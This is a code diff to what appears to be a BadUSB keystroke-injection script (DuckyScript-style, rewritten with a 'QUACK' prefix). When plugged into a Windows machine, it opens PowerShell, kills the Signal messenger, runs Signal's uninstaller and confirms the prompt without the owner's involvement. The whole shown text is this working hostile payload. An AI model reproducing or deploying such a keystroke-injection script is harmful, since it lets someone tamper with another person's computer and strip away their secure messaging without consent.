@@ -14,19 +14,19 @@
 *   - Signal App installed
 *   - ExecutionPolicy Bypass
 
-DELAY 2000
-GUI r
-DELAY 1000
-STRING powershell
-ENTER
-DELAY 2000
+QUACK DELAY 2000
+QUACK GUI r
+QUACK DELAY 1000
+QUACK STRING powershell
+QUACK ENTER
+QUACK DELAY 2000
 
-STRING Stop-Process -Name "Signal"
-ENTER
-DELAY 500
-STRING  Start-Process "$env:LocalAppData\Programs\signal-desktop\Uninstall Signal.exe"
-ENTER
-DELAY 1000
+QUACK STRING Stop-Process -Name "Signal"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING  Start-Process "$env:LocalAppData\Programs\signal-desktop\Uninstall Signal.exe"
+QUACK ENTER
+QUACK DELAY 1000
 * Popup "Are you sure?"
-ENTER
-ALT F4
+QUACK ENTER
+QUACK ALT F4
